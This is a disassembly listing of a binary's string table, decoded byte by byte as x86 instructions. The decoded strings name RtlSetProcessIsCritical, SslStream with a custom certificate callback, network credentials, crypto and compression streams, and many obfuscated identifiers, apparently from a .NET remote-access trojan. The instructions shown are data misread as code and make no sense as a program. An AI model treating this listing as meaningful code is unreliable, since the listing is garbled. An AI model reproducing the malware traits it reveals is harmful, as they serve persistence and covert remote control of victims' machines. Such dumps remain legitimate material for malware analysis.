  408a8f:	6a 00                	push   $0x0
  408a91:	78 51                	js     0x408ae4
  408a93:	72 75                	jb     0x408b0a
  408a95:	66 67 72 45          	data16 addr16 jb 0x408ade
  408a99:	69 76 45 75 6a 00 41 	imul   $0x41006a75,0x45(%esi),%esi
  408aa0:	73 79                	jae    0x408b1b
  408aa2:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa3:	63 43 61             	arpl   %eax,0x61(%ebx)
  408aa6:	6c                   	insb   (%dx),%es:(%edi)
  408aa7:	6c                   	insb   (%dx),%es:(%edi)
  408aa8:	62 61 63             	bound  %esp,0x63(%ecx)
  408aab:	6b 00 52             	imul   $0x52,(%eax),%eax
  408aae:	65 6d                	gs insl (%dx),%es:(%edi)
  408ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ab1:	74 65                	je     0x408b18
  408ab3:	43                   	inc    %ebx
  408ab4:	65 72 74             	gs jb  0x408b2b
  408ab7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408abe:	56                   	push   %esi
  408abf:	61                   	popa
  408ac0:	6c                   	insb   (%dx),%es:(%edi)
  408ac1:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408ac8:	43 
  408ac9:	61                   	popa
  408aca:	6c                   	insb   (%dx),%es:(%edi)
  408acb:	6c                   	insb   (%dx),%es:(%edi)
  408acc:	62 61 63             	bound  %esp,0x63(%ecx)
  408acf:	6b 00 54             	imul   $0x54,(%eax),%eax
  408ad2:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408ad9:	6c                   	insb   (%dx),%es:(%edi)
  408ada:	62 61 63             	bound  %esp,0x63(%ecx)
  408add:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ae0:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408ae7:	4b 65 
  408ae9:	79 50                	jns    0x408b3b
  408aeb:	65 72 6d             	gs jb  0x408b5b
  408aee:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408af5:	68 65 63 6b 00       	push   $0x6b6365
  408afa:	46                   	inc    %esi
  408afb:	6c                   	insb   (%dx),%es:(%edi)
  408afc:	75 73                	jne    0x408b71
  408afe:	68 46 69 6e 61       	push   $0x616e6946
  408b03:	6c                   	insb   (%dx),%es:(%edi)
  408b04:	42                   	inc    %edx
  408b05:	6c                   	insb   (%dx),%es:(%edi)
  408b06:	6f                   	outsl  %ds:(%esi),(%dx)
  408b07:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408b0a:	62 4d 73             	bound  %ecx,0x73(%ebp)
  408b0d:	4d                   	dec    %ebp
  408b0e:	73 75                	jae    0x408b85
  408b10:	53                   	push   %ebx
  408b11:	65 71 4b             	gs jno 0x408b5f
  408b14:	6b 77 65 6b          	imul   $0x6b,0x65(%edi),%esi
  408b18:	00 71 44             	add    %dh,0x44(%ecx)
  408b1b:	71 70                	jno    0x408b8d
  408b1d:	63 63 76             	arpl   %esp,0x76(%ebx)
  408b20:	70 62                	jo     0x408b84
  408b22:	58                   	pop    %eax
  408b23:	52                   	push   %edx
  408b24:	66 6b 00 54          	imul   $0x54,(%eax),%ax
  408b28:	6f                   	outsl  %ds:(%esi),(%dx)
  408b29:	47                   	inc    %edi
  408b2a:	43                   	inc    %ebx
  408b2b:	44                   	inc    %esp
  408b2c:	56                   	push   %esi
  408b2d:	41                   	inc    %ecx
  408b2e:	42                   	inc    %edx
  408b2f:	75 56                	jne    0x408b87
  408b31:	4c                   	dec    %esp
  408b32:	79 6f                	jns    0x408ba3
  408b34:	6b 00 65             	imul   $0x65,(%eax),%eax
  408b37:	4e                   	dec    %esi
  408b38:	53                   	push   %ebx
  408b39:	6b 47 71 44          	imul   $0x44,0x71(%edi),%eax
  408b3d:	76 56                	jbe    0x408b95
  408b3f:	4b                   	dec    %ebx
  408b40:	65 76 6b             	gs jbe 0x408bae
  408b43:	00 61 7a             	add    %ah,0x7a(%ecx)
  408b46:	46                   	inc    %esi
  408b47:	4c                   	dec    %esp
  408b48:	72 67                	jb     0x408bb1
  408b4a:	76 79                	jbe    0x408bc5
  408b4c:	46                   	inc    %esi
  408b4d:	6c                   	insb   (%dx),%es:(%edi)
  408b4e:	5a                   	pop    %edx
  408b4f:	59                   	pop    %ecx
  408b50:	47                   	inc    %edi
  408b51:	6c                   	insb   (%dx),%es:(%edi)
  408b52:	00 74 57 6e          	add    %dh,0x6e(%edi,%edx,2)
  408b56:	6e                   	outsb  %ds:(%esi),(%dx)
  408b57:	5a                   	pop    %edx
  408b58:	69 45 4c 50 68 64 71 	imul   $0x71646850,0x4c(%ebp),%eax
  408b5f:	55                   	push   %ebp
  408b60:	6c                   	insb   (%dx),%es:(%edi)
  408b61:	00 79 73             	add    %bh,0x73(%ecx)
  408b64:	64 47                	fs inc %edi
  408b66:	55                   	push   %ebp
  408b67:	4d                   	dec    %ebp
  408b68:	64 42                	fs inc %edx
  408b6a:	79 55                	jns    0x408bc1
  408b6c:	6c                   	insb   (%dx),%es:(%edi)
  408b6d:	00 51 41             	add    %dl,0x41(%ecx)
  408b70:	47                   	inc    %edi
  408b71:	6c                   	insb   (%dx),%es:(%edi)
  408b72:	57                   	push   %edi
  408b73:	64 46                	fs inc %esi
  408b75:	41                   	inc    %ecx
  408b76:	49                   	dec    %ecx
  408b77:	45                   	inc    %ebp
  408b78:	6e                   	outsb  %ds:(%esi),(%dx)
  408b79:	73 56                	jae    0x408bd1
  408b7b:	58                   	pop    %eax
  408b7c:	6c                   	insb   (%dx),%es:(%edi)
  408b7d:	00 52 74             	add    %dl,0x74(%edx)
  408b80:	6c                   	insb   (%dx),%es:(%edi)
  408b81:	53                   	push   %ebx
  408b82:	65 74 50             	gs je  0x408bd5
  408b85:	72 6f                	jb     0x408bf6
  408b87:	63 65 73             	arpl   %esp,0x73(%ebp)
  408b8a:	73 49                	jae    0x408bd5
  408b8c:	73 43                	jae    0x408bd1
  408b8e:	72 69                	jb     0x408bf9
  408b90:	74 69                	je     0x408bfb
  408b92:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408b95:	00 4e 65             	add    %cl,0x65(%esi)
  408b98:	74 77                	je     0x408c11
  408b9a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b9b:	72 6b                	jb     0x408c08
  408b9d:	43                   	inc    %ebx
  408b9e:	72 65                	jb     0x408c05
  408ba0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408ba3:	74 69                	je     0x408c0e
  408ba5:	61                   	popa
  408ba6:	6c                   	insb   (%dx),%es:(%edi)
  408ba7:	00 53 79             	add    %dl,0x79(%ebx)
  408baa:	73 74                	jae    0x408c20
  408bac:	65 6d                	gs insl (%dx),%es:(%edi)
  408bae:	2e 53                	cs push %ebx
  408bb0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408bb4:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408bbb:	6e 
  408bbc:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408bbf:	61                   	popa
  408bc0:	6c                   	insb   (%dx),%es:(%edi)
  408bc1:	00 57 69             	add    %dl,0x69(%edi)
  408bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc5:	64 6f                	outsl  %fs:(%esi),(%dx)
  408bc7:	77 73                	ja     0x408c3c
  408bc9:	50                   	push   %eax
  408bca:	72 69                	jb     0x408c35
  408bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcd:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408bd0:	61                   	popa
  408bd1:	6c                   	insb   (%dx),%es:(%edi)
  408bd2:	00 67 65             	add    %ah,0x65(%edi)
  408bd5:	74 5f                	je     0x408c36
  408bd7:	49                   	dec    %ecx
  408bd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd9:	74 65                	je     0x408c40
  408bdb:	72 76                	jb     0x408c53
  408bdd:	61                   	popa
  408bde:	6c                   	insb   (%dx),%es:(%edi)
  408bdf:	00 73 65             	add    %dh,0x65(%ebx)
  408be2:	74 5f                	je     0x408c43
  408be4:	49                   	dec    %ecx
  408be5:	6e                   	outsb  %ds:(%esi),(%dx)
  408be6:	74 65                	je     0x408c4d
  408be8:	72 76                	jb     0x408c60
  408bea:	61                   	popa
  408beb:	6c                   	insb   (%dx),%es:(%edi)
  408bec:	00 5a 58             	add    %bl,0x58(%edx)
  408bef:	4d                   	dec    %ebp
  408bf0:	79 46                	jns    0x408c38
  408bf2:	47                   	inc    %edi
  408bf3:	54                   	push   %esp
  408bf4:	41                   	inc    %ecx
  408bf5:	6d                   	insl   (%dx),%es:(%edi)
  408bf6:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf7:	47                   	inc    %edi
  408bf8:	61                   	popa
  408bf9:	54                   	push   %esp
  408bfa:	68 6c 00 6b 65       	push   $0x656b006c
  408bff:	72 6e                	jb     0x408c6f
  408c01:	65 6c                	gs insb (%dx),%es:(%edi)
  408c03:	33 32                	xor    (%edx),%esi
  408c05:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408c08:	6c                   	insb   (%dx),%es:(%edi)
  408c09:	00 6e 74             	add    %ch,0x74(%esi)
  408c0c:	64 6c                	fs insb (%dx),%es:(%edi)
  408c0e:	6c                   	insb   (%dx),%es:(%edi)
  408c0f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408c12:	6c                   	insb   (%dx),%es:(%edi)
  408c13:	00 4b 69             	add    %cl,0x69(%ebx)
  408c16:	6c                   	insb   (%dx),%es:(%edi)
  408c17:	6c                   	insb   (%dx),%es:(%edi)
  408c18:	00 50 6f             	add    %dl,0x6f(%eax)
  408c1b:	6c                   	insb   (%dx),%es:(%edi)
  408c1c:	6c                   	insb   (%dx),%es:(%edi)
  408c1d:	00 6c 52 42          	add    %ch,0x42(%edx,%edx,2)
  408c21:	74 52                	je     0x408c75
  408c23:	66 41                	inc    %cx
  408c25:	61                   	popa
  408c26:	62 73 6d             	bound  %esi,0x6d(%ebx)
  408c29:	66 76 6c             	data16 jbe 0x408c98
  408c2c:	00 46 69             	add    %al,0x69(%esi)
  408c2f:	6c                   	insb   (%dx),%es:(%edi)
  408c30:	65 53                	gs push %ebx
  408c32:	74 72                	je     0x408ca6
  408c34:	65 61                	gs popa
  408c36:	6d                   	insl   (%dx),%es:(%edi)
  408c37:	00 4e 65             	add    %cl,0x65(%esi)
  408c3a:	74 77                	je     0x408cb3
  408c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3d:	72 6b                	jb     0x408caa
  408c3f:	53                   	push   %ebx
  408c40:	74 72                	je     0x408cb4
  408c42:	65 61                	gs popa
  408c44:	6d                   	insl   (%dx),%es:(%edi)
  408c45:	00 53 73             	add    %dl,0x73(%ebx)
  408c48:	6c                   	insb   (%dx),%es:(%edi)
  408c49:	53                   	push   %ebx
  408c4a:	74 72                	je     0x408cbe
  408c4c:	65 61                	gs popa
  408c4e:	6d                   	insl   (%dx),%es:(%edi)
  408c4f:	00 43 72             	add    %al,0x72(%ebx)
  408c52:	79 70                	jns    0x408cc4
  408c54:	74 6f                	je     0x408cc5
  408c56:	53                   	push   %ebx
  408c57:	74 72                	je     0x408ccb
  408c59:	65 61                	gs popa
  408c5b:	6d                   	insl   (%dx),%es:(%edi)
  408c5c:	00 47 5a             	add    %al,0x5a(%edi)
  408c5f:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408c66:	6d                   	insl   (%dx),%es:(%edi)
  408c67:	00 4d 65             	add    %cl,0x65(%ebp)
  408c6a:	6d                   	insl   (%dx),%es:(%edi)
  408c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6c:	72 79                	jb     0x408ce7
  408c6e:	53                   	push   %ebx
  408c6f:	74 72                	je     0x408ce3
  408c71:	65 61                	gs popa
  408c73:	6d                   	insl   (%dx),%es:(%edi)
  408c74:	00 67 65             	add    %ah,0x65(%edi)
  408c77:	74 5f                	je     0x408cd8
  408c79:	49                   	dec    %ecx
  408c7a:	74 65                	je     0x408ce1
  408c7c:	6d                   	insl   (%dx),%es:(%edi)
  408c7d:	00 67 65             	add    %ah,0x65(%edi)
  408c80:	74 5f                	je     0x408ce1
  408c82:	49                   	dec    %ecx
  408c83:	73 36                	jae    0x408cbb
  408c85:	34 42                	xor    $0x42,%al
  408c87:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408c8e:	74 
  408c8f:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408c96:	65 6d                	gs insl (%dx),%es:(%edi)
  408c98:	00 53 79             	add    %dl,0x79(%ebx)
  408c9b:	6d                   	insl   (%dx),%es:(%edi)
  408c9c:	6d                   	insl   (%dx),%es:(%edi)
  408c9d:	65 74 72             	gs je  0x408d12
  408ca0:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408ca7:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408cae:	79 
  408caf:	6d                   	insl   (%dx),%es:(%edi)
  408cb0:	6d                   	insl   (%dx),%es:(%edi)
  408cb1:	65 74 72             	gs je  0x408d26
  408cb4:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408cbb:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408cc2:	73 
  408cc3:	68 41 6c 67 6f       	push   $0x6f676c41
  408cc8:	72 69                	jb     0x408d33
  408cca:	74 68                	je     0x408d34
  408ccc:	6d                   	insl   (%dx),%es:(%edi)
  408ccd:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408cd1:	6d                   	insl   (%dx),%es:(%edi)
  408cd2:	00 52 61             	add    %dl,0x61(%edx)
  408cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd6:	64 6f                	outsl  %fs:(%esi),(%dx)
  408cd8:	6d                   	insl   (%dx),%es:(%edi)
  408cd9:	00 49 43             	add    %cl,0x43(%ecx)
  408cdc:	72 79                	jb     0x408d57
  408cde:	70 74                	jo     0x408d54
  408ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce1:	54                   	push   %esp
  408ce2:	72 61                	jb     0x408d45
  408ce4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce5:	73 66                	jae    0x408d4d
  408ce7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ce8:	72 6d                	jb     0x408d57
  408cea:	00 73 54             	add    %dh,0x54(%ebx)
  408ced:	4c                   	dec    %esp
  408cee:	5a                   	pop    %edx
  408cef:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf0:	76 66                	jbe    0x408d58
  408cf2:	47                   	inc    %edi
  408cf3:	4f                   	dec    %edi
  408cf4:	48                   	dec    %eax
  408cf5:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf6:	5a                   	pop    %edx
  408cf7:	73 6d                	jae    0x408d66
  408cf9:	00 63 59             	add    %ah,0x59(%ebx)
  408cfc:	67 48                	addr16 dec %eax
  408cfe:	4b                   	dec    %ebx
  408cff:	44                   	inc    %esp
  408d00:	55                   	push   %ebp
  408d01:	42                   	inc    %edx
  408d02:	41                   	inc    %ecx
  408d03:	44                   	inc    %esp
  408d04:	73 46                	jae    0x408d4c
  408d06:	75 6d                	jne    0x408d75
  408d08:	00 45 6e             	add    %al,0x6e(%ebp)
  408d0b:	75 6d                	jne    0x408d7a
  408d0d:	00 51 4f             	add    %dl,0x4f(%ecx)
  408d10:	75 66                	jne    0x408d78
  408d12:	48                   	dec    %eax
  408d13:	74 46                	je     0x408d5b
  408d15:	71 76                	jno    0x408d8d
  408d17:	6d                   	insl   (%dx),%es:(%edi)
  408d18:	00 41 77             	add    %al,0x77(%ecx)
  408d1b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d1c:	4d                   	dec    %ebp
  408d1d:	61                   	popa
  408d1e:	4a                   	dec    %edx
  408d1f:	4d                   	dec    %ebp
  408d20:	79 6f                	jns    0x408d91
  408d22:	69 6b 46 53 78 6d 00 	imul   $0x6d7853,0x46(%ebx),%ebp
  408d29:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2a:	43                   	inc    %ebx
  408d2b:	6a 47                	push   $0x47
  408d2d:	65 61                	gs popa
  408d2f:	49                   	dec    %ecx
  408d30:	44                   	inc    %esp
  408d31:	65 4c                	gs dec %esp
  408d33:	6e                   	outsb  %ds:(%esi),(%dx)
  408d34:	00 43 6f             	add    %al,0x6f(%ebx)
  408d37:	57                   	push   %edi
  408d38:	65 67 70 6e          	gs addr16 jo 0x408daa
  408d3c:	4f                   	dec    %edi
  408d3d:	42                   	inc    %edx
  408d3e:	69 4e 4e 6e 00 71 6a 	imul   $0x6a71006e,0x4e(%esi),%ecx
  408d45:	6f                   	outsl  %ds:(%esi),(%dx)
  408d46:	79 64                	jns    0x408dac
  408d48:	46                   	inc    %esi
  408d49:	7a 7a                	jp     0x408dc5
  408d4b:	46                   	inc    %esi
  408d4c:	75 75                	jne    0x408dc3
  408d4e:	58                   	pop    %eax
  408d4f:	6a 50                	push   $0x50
  408d51:	6e                   	outsb  %ds:(%esi),(%dx)
  408d52:	00 49 65             	add    %cl,0x65(%ecx)
  408d55:	45                   	inc    %ebp
  408d56:	4c                   	dec    %esp
  408d57:	78 42                	js     0x408d9b
  408d59:	48                   	dec    %eax
  408d5a:	59                   	pop    %ecx
  408d5b:	42                   	inc    %edx
  408d5c:	73 75                	jae    0x408dd3
  408d5e:	58                   	pop    %eax
  408d5f:	74 50                	je     0x408db1
  408d61:	6e                   	outsb  %ds:(%esi),(%dx)
  408d62:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408d66:	6f                   	outsl  %ds:(%esi),(%dx)
  408d67:	6f                   	outsl  %ds:(%esi),(%dx)
  408d68:	6c                   	insb   (%dx),%es:(%edi)
  408d69:	65 61                	gs popa
  408d6b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6c:	00 49 51             	add    %cl,0x51(%ecx)
  408d6f:	4a                   	dec    %edx
  408d70:	4e                   	dec    %esi
  408d71:	68 69 69 76 41       	push   $0x41766969
  408d76:	58                   	pop    %eax
  408d77:	65 49                	gs dec %ecx
  408d79:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  408d7b:	00 4d 61             	add    %cl,0x61(%ebp)
  408d7e:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  408d85:	43                   	inc    %ebx
  408d86:	68 61 69 6e 00       	push   $0x6e6961
  408d8b:	41                   	inc    %ecx
  408d8c:	70 70                	jo     0x408dfe
  408d8e:	44                   	inc    %esp
  408d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d90:	6d                   	insl   (%dx),%es:(%edi)
  408d91:	61                   	popa
  408d92:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408d99:	43                   	inc    %ebx
  408d9a:	75 72                	jne    0x408e0e
  408d9c:	72 65                	jb     0x408e03
  408d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d9f:	74 44                	je     0x408de5
  408da1:	6f                   	outsl  %ds:(%esi),(%dx)
  408da2:	6d                   	insl   (%dx),%es:(%edi)
  408da3:	61                   	popa
  408da4:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408dab:	00 47 65             	add    %al,0x65(%edi)
  408dae:	74 46                	je     0x408df6
  408db0:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408db7:	57 
  408db8:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408dbf:	78 
  408dc0:	74 65                	je     0x408e27
  408dc2:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc3:	73 69                	jae    0x408e2e
  408dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408dc7:	00 67 65             	add    %ah,0x65(%edi)
  408dca:	74 5f                	je     0x408e2b
  408dcc:	4f                   	dec    %edi
  408dcd:	53                   	push   %ebx
  408dce:	56                   	push   %esi
  408dcf:	65 72 73             	gs jb  0x408e45
  408dd2:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408dd9:	74 65                	je     0x408e40
  408ddb:	6d                   	insl   (%dx),%es:(%edi)
  408ddc:	2e 49                	cs dec %ecx
  408dde:	4f                   	dec    %edi
  408ddf:	2e 43                	cs inc %ebx
  408de1:	6f                   	outsl  %ds:(%esi),(%dx)
  408de2:	6d                   	insl   (%dx),%es:(%edi)
  408de3:	70 72                	jo     0x408e57
  408de5:	65 73 73             	gs jae 0x408e5b
  408de8:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408def:	6c                   	insb   (%dx),%es:(%edi)
  408df0:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408df7:	00 53 79             	add    %dl,0x79(%ebx)
  408dfa:	73 74                	jae    0x408e70
  408dfc:	65 6d                	gs insl (%dx),%es:(%edi)
  408dfe:	2e 53                	cs push %ebx
  408e00:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e04:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408e0b:	68 
  408e0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e0e:	74 69                	je     0x408e79
  408e10:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e13:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408e1a:	74 65                	je     0x408e81
  408e1c:	6d                   	insl   (%dx),%es:(%edi)
  408e1d:	2e 52                	cs push %edx
  408e1f:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408e22:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e27:	6e                   	outsb  %ds:(%esi),(%dx)
  408e28:	00 58 35             	add    %bl,0x35(%eax)
  408e2b:	30 39                	xor    %bh,(%ecx)
  408e2d:	43                   	inc    %ebx
  408e2e:	65 72 74             	gs jb  0x408ea5
  408e31:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e38:	43                   	inc    %ebx
  408e39:	6f                   	outsl  %ds:(%esi),(%dx)
  408e3a:	6c                   	insb   (%dx),%es:(%edi)
  408e3b:	6c                   	insb   (%dx),%es:(%edi)
  408e3c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e41:	6e                   	outsb  %ds:(%esi),(%dx)
  408e42:	00 4d 61             	add    %cl,0x61(%ebp)
  408e45:	6e                   	outsb  %ds:(%esi),(%dx)
  408e46:	61                   	popa
  408e47:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e4a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e4c:	74 4f                	je     0x408e9d
  408e4e:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e51:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408e55:	6c                   	insb   (%dx),%es:(%edi)
  408e56:	6c                   	insb   (%dx),%es:(%edi)
  408e57:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e5d:	00 73 65             	add    %dh,0x65(%ebx)
  408e60:	74 5f                	je     0x408ec1
  408e62:	50                   	push   %eax
  408e63:	6f                   	outsl  %ds:(%esi),(%dx)
  408e64:	73 69                	jae    0x408ecf
  408e66:	74 69                	je     0x408ed1
  408e68:	6f                   	outsl  %ds:(%esi),(%dx)
  408e69:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6a:	00 43 72             	add    %al,0x72(%ebx)
  408e6d:	79 70                	jns    0x408edf
  408e6f:	74 6f                	je     0x408ee0
  408e71:	67 72 61             	addr16 jb 0x408ed5
  408e74:	70 68                	jo     0x408ede
  408e76:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408e7d:	74 69                	je     0x408ee8
  408e7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408e80:	6e                   	outsb  %ds:(%esi),(%dx)
  408e81:	00 41 72             	add    %al,0x72(%ecx)
  408e84:	67 75 6d             	addr16 jne 0x408ef4
  408e87:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e89:	74 4e                	je     0x408ed9
  408e8b:	75 6c                	jne    0x408ef9
  408e8d:	6c                   	insb   (%dx),%es:(%edi)
  408e8e:	45                   	inc    %ebp
  408e8f:	78 63                	js     0x408ef4
  408e91:	65 70 74             	gs jo  0x408f08
  408e94:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408e9b:	75 6d                	jne    0x408f0a
  408e9d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e9f:	74 45                	je     0x408ee6
  408ea1:	78 63                	js     0x408f06
  408ea3:	65 70 74             	gs jo  0x408f1a
  408ea6:	69 6f 6e 00 44 67 67 	imul   $0x67674400,0x6e(%edi),%ebp
  408ead:	7a 66                	jp     0x408f15
  408eaf:	65 4c                	gs dec %esp
  408eb1:	68 4e 45 7a 6e       	push   $0x6e7a454e
  408eb6:	00 41 47             	add    %al,0x47(%ecx)
  408eb9:	77 57                	ja     0x408f12
  408ebb:	7a 49                	jp     0x408f06
  408ebd:	77 49                	ja     0x408f08
  408ebf:	45                   	inc    %ebp
  408ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec1:	00 48 7a             	add    %cl,0x7a(%eax)
  408ec4:	67 4a                	addr16 dec %edx
  408ec6:	6d                   	insl   (%dx),%es:(%edi)
  408ec7:	68 4a 72 79 61       	push   $0x6179724a
  408ecc:	54                   	push   %esp
  408ecd:	71 50                	jno    0x408f1f
  408ecf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed0:	00 76 51             	add    %dh,0x51(%esi)
  408ed3:	62 56 61             	bound  %edx,0x61(%esi)
  408ed6:	41                   	inc    %ecx
  408ed7:	66 72 66             	data16 jb 0x408f40
  408eda:	51                   	push   %ecx
  408edb:	72 6d                	jb     0x408f4a
  408edd:	78 62                	js     0x408f41
  408edf:	70 61                	jo     0x408f42
  408ee1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee2:	00 64 71 53          	add    %ah,0x53(%ecx,%esi,2)
  408ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee8:	44                   	inc    %esp
  408ee9:	7a 4e                	jp     0x408f39
  408eeb:	4f                   	dec    %edi
  408eec:	49                   	dec    %ecx
  408eed:	56                   	push   %esi
  408eee:	63 66 6f             	arpl   %esp,0x6f(%esi)
  408ef1:	00 49 6d             	add    %cl,0x6d(%ecx)
  408ef4:	61                   	popa
  408ef5:	67 65 43             	addr16 gs inc %ebx
  408ef8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ef9:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408efe:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f00:	00 46 69             	add    %al,0x69(%esi)
  408f03:	6c                   	insb   (%dx),%es:(%edi)
  408f04:	65 49                	gs dec %ecx
  408f06:	6e                   	outsb  %ds:(%esi),(%dx)
  408f07:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f09:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408f0d:	76 65                	jbe    0x408f74
  408f0f:	49                   	dec    %ecx
  408f10:	6e                   	outsb  %ds:(%esi),(%dx)
  408f11:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f13:	00 46 69             	add    %al,0x69(%esi)
  408f16:	6c                   	insb   (%dx),%es:(%edi)
  408f17:	65 53                	gs push %ebx
  408f19:	79 73                	jns    0x408f8e
  408f1b:	74 65                	je     0x408f82
  408f1d:	6d                   	insl   (%dx),%es:(%edi)
  408f1e:	49                   	dec    %ecx
  408f1f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f20:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f22:	00 43 6f             	add    %al,0x6f(%ebx)
  408f25:	6d                   	insl   (%dx),%es:(%edi)
  408f26:	70 75                	jo     0x408f9d
  408f28:	74 65                	je     0x408f8f
  408f2a:	72 49                	jb     0x408f75
  408f2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f2d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f2f:	00 43 53             	add    %al,0x53(%ebx)
  408f32:	68 61 72 70 41       	push   $0x41707261
  408f37:	72 67                	jb     0x408fa0
  408f39:	75 6d                	jne    0x408fa8
  408f3b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f3d:	74 49                	je     0x408f88
  408f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f40:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f42:	00 73 65             	add    %dh,0x65(%ebx)
  408f45:	74 5f                	je     0x408fa6
  408f47:	53                   	push   %ebx
  408f48:	74 61                	je     0x408fab
  408f4a:	72 74                	jb     0x408fc0
  408f4c:	49                   	dec    %ecx
  408f4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f50:	00 50 72             	add    %dl,0x72(%eax)
  408f53:	6f                   	outsl  %ds:(%esi),(%dx)
  408f54:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f57:	73 53                	jae    0x408fac
  408f59:	74 61                	je     0x408fbc
  408f5b:	72 74                	jb     0x408fd1
